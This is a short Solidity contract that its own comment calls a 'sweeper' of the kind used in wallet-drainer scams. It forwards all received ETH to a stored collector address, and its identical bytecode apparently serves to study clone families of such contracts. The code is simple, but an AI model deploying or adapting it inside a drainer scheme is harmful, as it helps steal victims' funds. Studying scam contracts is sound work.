// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// A "sweeper" of the kind used in wallet-drainer scams: any ETH sent to it is
/// forwarded straight to a collector. The collector is kept in storage (not an
/// immutable), so every deployment has identical runtime bytecode: a clone family.
contract Sweeper {
    address public collector;
    uint256 public swept;

    event Swept(address indexed from, uint256 amount);

    constructor(address collector_) {
        collector = collector_;
    }

    receive() external payable {
        swept += msg.value;
        (bool ok, ) = collector.call{value: msg.value}("");
        require(ok, "forward failed");
        emit Swept(msg.sender, msg.value);
    }

    function sweep() external {
        uint256 amount = address(this).balance;
        (bool ok, ) = collector.call{value: amount}("");
        require(ok, "sweep failed");
    }
}
